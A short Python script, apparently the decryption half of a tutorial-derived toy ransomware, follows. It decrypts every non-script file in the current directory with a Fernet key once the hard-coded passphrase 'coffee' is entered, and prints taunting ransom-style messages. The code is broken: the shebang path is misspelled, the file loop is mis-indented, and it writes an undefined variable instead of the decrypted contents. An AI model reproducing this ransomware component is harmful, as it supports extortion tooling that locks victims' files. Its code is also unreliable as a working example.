#!/urs/bin/env python3
## This was made from watching tutorial at
##https://www.youtube.com/user/NetworkChuck

 #### WARNING ######
 # This is just a proof of concept is is not meant for any real world application.
 # DO NOT USE this script on any systems you don't have written, explicit permission for owner to do so
 # USE At OWN RISK, I am not responsible for ANY out come due to the usage of this script.
##### WARNING #####

import os
from cryptography.fernet import Fernet

files = []

        for file in os.listdir():
            if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
                continue
            if os.path.isfile(file):
                files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "coffee"

user_phrase = input("Enter pass to decrypt\n")

if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
    print("pleasure duin business wicha")
else:
    print("Ah, Ah, Ah, did'nt say the magic word")
